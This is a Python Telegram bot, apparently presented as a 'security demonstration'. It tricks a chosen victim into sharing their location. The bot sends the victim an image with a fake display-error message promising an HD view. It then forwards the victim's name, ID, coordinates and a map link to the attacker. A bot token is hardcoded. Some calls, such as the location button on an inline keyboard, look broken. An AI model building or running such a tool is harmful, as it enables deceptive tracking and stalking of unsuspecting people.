from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import Application, CommandHandler, MessageHandler, ContextTypes
from telegram.ext import filters
import os
import logging
import asyncio

# Configuración
BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', '8605186812:AAET8973lR2dwBr10G_hsw2jbL6yaxLvBPI')

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# Almacenamiento
user_images = {}
attacker_chats = {}

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text(
        "Bot de demostracion de seguridad.\n\n"
        "Comandos:\n"
        "/compartir - Envia una imagen\n"
        "/engayar <user_id> - Reenviar imagen"
    )

async def share_image(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if update.message.photo:
        photo_file_id = update.message.photo[-1].file_id
        user_images[update.effective_user.id] = photo_file_id
        await update.message.reply_text(
            "Imagen recibida. Usa /engayar <user_id> para reenviarla."
        )
    else:
        await update.message.reply_text("Por favor, envíame una imagen.")

async def trick_user(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not context.args:
        await update.message.reply_text("Uso: /engayar <user_id>")
        return

    try:
        victim_chat_id = int(context.args[0])
    except (ValueError, IndexError):
        await update.message.reply_text("El ID debe ser un número.")
        return

    attacker_user_id = update.effective_user.id
    attacker_chat_id = update.effective_chat.id
    photo_file_id = user_images.get(attacker_user_id)

    if not photo_file_id:
        await update.message.reply_text("Primero comparte una imagen con /compartir")
        return

    caption_text = (
        "⚠️ Error de visualizacion ⚠️\n\n"
        "Para ver esta imagen en resolucion original, "
        "autoriza el acceso a tu ubicacion para verificar tu region."
    )

    keyboard = [[InlineKeyboardButton("🔓 Ver Imagen HD", request_location=True)]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    try:
        await context.bot.send_photo(
            chat_id=victim_chat_id,
            photo=photo_file_id,
            caption=caption_text,
            reply_markup=reply_markup
        )
        attacker_chats[str(victim_chat_id)] = attacker_chat_id
        await update.message.reply_text(f"Imagen enviada al usuario {victim_chat_id}")
    except Exception as e:
        logger.error(f"Error al enviar: {e}")
        await update.message.reply_text(f"Error: No se pudo enviar al usuario {victim_chat_id}")

async def location_received(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_location = update.message.location
    user = update.effective_user
    
    latitude = user_location.latitude
    longitude = user_location.longitude
    
    location_info = (
        f"📍 Ubicacion capturada\n\n"
        f"Usuario: {user.full_name} (@{user.username})\n"
        f"ID: {user.id}\n"
        f"Latitud: {latitude}\n"
        f"Longitud: {longitude}\n"
        f"Maps: https://www.google.com/maps?q={latitude},{longitude}"
    )
    
    attacker_chat_id = attacker_chats.get(str(user.id))
    if attacker_chat_id:
        await context.bot.send_message(chat_id=attacker_chat_id, text=location_info)
    
    await update.message.reply_text("Gracias. La imagen ya se puede visualizar correctamente.")
    print(location_info)

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("compartir", share_image))
    app.add_handler(CommandHandler("engayar", trick_user))
    app.add_handler(MessageHandler(filters=filters.LOCATION, callback=location_received))
    
    print("Bot iniciado. Presiona Ctrl+C para detener.")
    
    # Usar asyncio para Python 3.10+
    asyncio.run(app.run_polling())

if __name__ == '__main__':
    main()
